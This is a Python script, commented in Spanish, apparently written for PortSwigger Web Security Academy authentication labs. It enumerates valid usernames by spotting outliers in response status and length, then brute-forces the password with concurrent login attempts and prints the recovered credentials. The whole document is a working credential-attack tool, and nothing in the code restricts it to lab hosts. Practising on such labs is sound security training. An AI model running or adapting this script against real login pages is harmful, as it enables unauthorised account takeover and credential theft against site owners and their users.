#!/usr/bin/env python3
"""
Username enumeration + password brute-force para PortSwigger labs de auth.

Aprovecha el side-channel de respuesta diferencial: el server responde distinto
para "username invalido" vs "username valido, password invalido". El outlier en
distribución de status/length identifica el match en cada fase.

Uso:
    python3 bruteforce.py <lab-host> <usernames-file> <passwords-file>

Ejemplo:
    python3 bruteforce.py 0a1b2c3d.web-security-academy.net usernames.txt passwords.txt

Wordlists oficiales del lab:
    https://portswigger.net/web-security/authentication/auth-lab-usernames
    https://portswigger.net/web-security/authentication/auth-lab-passwords
(copiar el texto y guardar como archivo, una entrada por linea)
"""
import argparse
import sys
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlencode

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


def make_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 auth-bruteforce",
    })
    retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[502, 503])
    s.mount("https://", HTTPAdapter(max_retries=retry, pool_maxsize=64))
    return s


def attempt_login(session: requests.Session, host: str, username: str, password: str):
    body = urlencode({"username": username, "password": password})
    try:
        r = session.post(
            f"https://{host}/login",
            data=body,
            timeout=15,
            allow_redirects=False,
        )
        return r.status_code, len(r.content), r.text
    except requests.RequestException as e:
        return -1, 0, type(e).__name__


def find_outlier(results: list[tuple[str, int, int]]) -> list[tuple[str, int, int]]:
    """Devuelve resultados cuyo (status, length) difiere del modo. Lista vacia si todos iguales."""
    fingerprints = Counter((status, length) for _, status, length in results)
    common_fp = fingerprints.most_common(1)[0][0]
    return [(label, status, length) for label, status, length in results if (status, length) != common_fp]


def phase(label: str, candidates: list[str], probe, workers: int) -> list[tuple[str, int, int]]:
    print(f"\n[*] {label}: probando {len(candidates)} candidatos (workers={workers})...", file=sys.stderr)
    results = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(probe, c): c for c in candidates}
        for fut in as_completed(futures):
            c = futures[fut]
            status, length, _ = fut.result()
            results.append((c, status, length))

    fingerprints = Counter((status, length) for _, status, length in results)
    print(f"[*] distribucion (status,length): {dict(fingerprints)}", file=sys.stderr)
    return results


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("host", help="lab host, ej. 0a1b....web-security-academy.net")
    p.add_argument("usernames_file", help="ruta a wordlist de usernames (una por linea)")
    p.add_argument("passwords_file", help="ruta a wordlist de passwords (una por linea)")
    p.add_argument("--workers", type=int, default=20, help="threads concurrentes (default 20)")
    p.add_argument("--dummy-password", default="invalid_dummy_pwd", help="password fijo en fase 1")
    args = p.parse_args()

    with open(args.usernames_file) as f:
        usernames = [line.strip() for line in f if line.strip()]
    with open(args.passwords_file) as f:
        passwords = [line.strip() for line in f if line.strip()]

    session = make_session()

    # Fase 1: enumerar username valido
    results_u = phase(
        "Fase 1 (enum usernames)",
        usernames,
        lambda u: attempt_login(session, args.host, u, args.dummy_password),
        args.workers,
    )
    outliers_u = find_outlier(results_u)
    if not outliers_u:
        print("[!] ningun outlier en fase 1. el filtro responde uniforme o el endpoint es otro.", file=sys.stderr)
        return 1
    if len(outliers_u) > 1:
        print(f"[!] {len(outliers_u)} outliers en fase 1, esperaba 1. revisar manualmente:", file=sys.stderr)
        for u, s, l in outliers_u:
            print(f"    {u:<30}  status={s}  len={l}", file=sys.stderr)
        return 1
    valid_user, s, l = outliers_u[0]
    print(f"\n[+] username valido: {valid_user}  (status={s}, len={l})", file=sys.stderr)

    # Fase 2: brute-force password con username valido
    results_p = phase(
        "Fase 2 (brute pwd)",
        passwords,
        lambda pw: attempt_login(session, args.host, valid_user, pw),
        args.workers,
    )
    outliers_p = find_outlier(results_p)
    if not outliers_p:
        print("[!] ningun outlier en fase 2. password no esta en la wordlist o respuesta es uniforme.", file=sys.stderr)
        return 1
    if len(outliers_p) > 1:
        print(f"[!] {len(outliers_p)} outliers en fase 2, revisar manualmente:", file=sys.stderr)
        for pw, s, l in outliers_p:
            print(f"    {pw:<30}  status={s}  len={l}", file=sys.stderr)
        return 1
    valid_pwd, s, l = outliers_p[0]
    print(f"\n[+] password valido: {valid_pwd}  (status={s}, len={l})", file=sys.stderr)

    print(f"\n[+] credenciales: {valid_user}:{valid_pwd}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
